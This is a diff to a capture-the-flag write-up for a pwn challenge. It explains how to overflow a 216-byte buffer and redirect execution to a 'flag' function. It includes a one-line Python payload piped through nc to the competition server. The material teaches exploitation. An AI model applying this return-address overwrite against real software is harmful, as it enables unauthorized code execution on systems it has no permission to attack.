@@ -11,11 +11,11 @@ the addresses are still the same
 
 ## Solution
 
-Disassemble the bin file using ghidra and check the buffer dimension: it is 216 locally (208 on server). You'll notice that if you put 220 "a" the program try to call a function at the address: "0x7f0061616161" (character "a" in ASCII is equal to 0x61 in hex).
+Disassemble the bin file using ghidra and check the buffer dimension: it is 216 locally (208 on server). You'll notice that if you send 220 "a" as input, the program will try to call a function at the address: "0x7f0061616161" (character "a" in ASCII is equal to 0x61 in hex).
 So just use the command:
 
 ```
 python -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd5\x11\x40\x00\x00\x00\x00\x00'" | nc pwn.hsctf.com 5002
 ```
 
-This will cause a bufferoverflow + make the program run the function flag (address 0x04011d5) to get the flag.txt from the server.
+This will cause a bufferoverflow and make the program run the function "flag" (address 0x04011d5) to get the flag.txt from the server.
